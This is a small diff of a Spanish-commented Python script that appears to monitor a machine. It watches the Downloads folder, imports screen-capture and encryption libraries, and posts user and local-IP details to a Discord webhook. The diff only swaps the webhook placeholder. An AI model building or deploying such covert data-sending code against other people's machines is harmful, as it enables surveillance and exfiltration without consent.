@@ -11,8 +11,8 @@ from PIL import ImageGrab
 from cryptography.fernet import Fernet
 import requests
 
-# Webhook de Discord (pon aquí tu URL)
-WEBHOOK_URL = "AQUI_TU_WEBHOOK"
+# Webhook de Discord
+WEBHOOK_URL = "URL:dcrd"
 
 # --- CONFIGURACIÓN ---
 CARPETA_VIGILADA = os.path.expanduser("~/Downloads")
@@ -130,7 +130,7 @@ def obtener_info_usuario():
         f"Accede a la API Flask en http://{ip_local}:5000 desde otro dispositivo"
     )
     guardar_log(mensaje)
-    if WEBHOOK_URL != "AQUI_TU_WEBHOOK":
+    if WEBHOOK_URL != "URL:dcrd":
         try:
             requests.post(WEBHOOK_URL, json={"content": mensaje})
         except:
